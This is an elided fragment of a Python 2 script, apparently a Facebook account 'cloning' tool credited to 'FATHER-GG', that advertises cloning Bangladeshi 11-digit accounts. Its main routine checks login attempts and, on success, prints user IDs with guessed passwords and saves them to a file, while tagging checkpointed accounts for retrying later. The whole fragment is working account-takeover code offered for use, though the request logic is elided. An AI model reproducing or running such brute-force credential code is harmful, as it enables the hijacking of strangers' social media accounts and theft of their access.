...
os.system('clear')
psb('\x1b[1;32mWEALCOME TO FATHER-GG -- BANGLADESH 11 DIGIT CLONING START PLEASE WAIT ...............')
...
def menu():
    ...
    print '\x1b[1;96mAUTHOR  : THEORY-GG '
    print '\x1b[1;96mYOUTUBE: Free Script YT '
    print '\x1b[1;96mGITHUB  : github.com/FATHER-GG'
    print ''
    print 50* '-'
    print '\x1b[1;92m--------------------------------------------------'
    print
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[FATHER_OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[FATHER_CP]\x1b[1;92m ' + k + c + user + ' | ' + pass1 + ' \x1b[1;96m [After 7 Days]\x1b[0m \n'
